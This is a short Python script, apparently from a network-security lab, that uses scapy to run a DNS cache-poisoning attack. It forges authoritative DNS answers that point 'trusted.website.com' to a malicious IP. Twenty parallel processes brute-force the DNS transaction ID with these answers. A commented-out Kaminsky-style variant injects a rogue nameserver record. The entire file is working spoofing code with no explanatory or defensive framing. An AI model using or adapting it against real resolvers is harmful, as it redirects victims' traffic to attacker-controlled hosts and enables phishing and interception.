from scapy.all import *
import multiprocessing as mp


src_ip="192.168.0.100"
dst_ip="192.168.0.200"
mal_ip="192.168.0.151"

src_port=53
dst_port=6666

website='trusted.website.com'
dnswebsite='dnswebsite.website.com'

#precompute standard object
response=(IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port,sport=src_port)/DNS(id=1, qr=1, aa=1, qd=DNSQR(qname=website), an=DNSRR(rrname=website, ttl=604769, rdata=mal_ip)))

#kaminsky
#response=(IP(dst=src_ip, src=dst_ip)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=1, qr=1, aa=1, qd=DNSQR(qname=website), ns=DNSRR(rrname=website, type='NS', ttl=604769, rdata=dnswebsite), ar=DNSRR(rrname=dnswebsite, type='A', ttl=604769, rdata="192.168.0.150")))


dns_layer = response[DNS]

s = conf.L3socket()

def attack(start, end):
	for i in range (start,end,1):
		dns_layer.id = i
		s.send(response)
		

if __name__ == "__main__":
	mp.set_start_method('spawn')
	for i in range(0,20,1):
		mp.Process(target=attack, args=((i*500), (i+1)*500)).start()
